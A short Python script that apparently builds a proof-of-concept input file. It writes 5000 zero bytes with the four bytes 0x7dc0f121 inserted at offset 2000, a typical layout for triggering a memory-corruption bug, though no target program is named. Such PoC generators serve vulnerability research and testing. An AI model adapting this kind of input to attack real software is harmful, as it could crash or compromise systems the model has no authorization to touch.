def to_intarray(hex_str):
    arr = []
    ch = ['a', 'b', 'c', 'd', 'e', 'f']
    if hex_str.startswith("0x"):
        hex_str = hex_str[2:]
    if len(hex_str) % 2 == 1:
        hex_str = "0" + hex_str
    for index in range(0, int(len(hex_str)/2)):
        i = index * 2
        v = 0
        v2 = 0
        if hex_str[i] in ch:
            v = 10 + ord(hex_str[i]) - ord('a')
        else:
            v = ord(hex_str[i]) - ord('0')
        v = v * 16

        if hex_str[i+1] in ch:
            v2 = 10 + ord(hex_str[i+1]) - ord('a')
        else:
            v2 = ord(hex_str[i+1]) - ord('0')
        v = v + v2
        arr.append(v)
    return arr

def gen_poc():
    arr = []
    hex_str = "0x7dc0f121"
    int_arr = to_intarray(hex_str)
    for i in range(0, 5000):
        if i == 2000:
            print("insert")
            arr.append(int_arr[0])
            arr.append(int_arr[1])
            arr.append(int_arr[2])
            arr.append(int_arr[3])
        else:
            arr.append(0x00)
    with open("poc", "wb") as fp:
        fp.write(bytearray(arr))

if __name__ == '__main__':
    gen_poc()
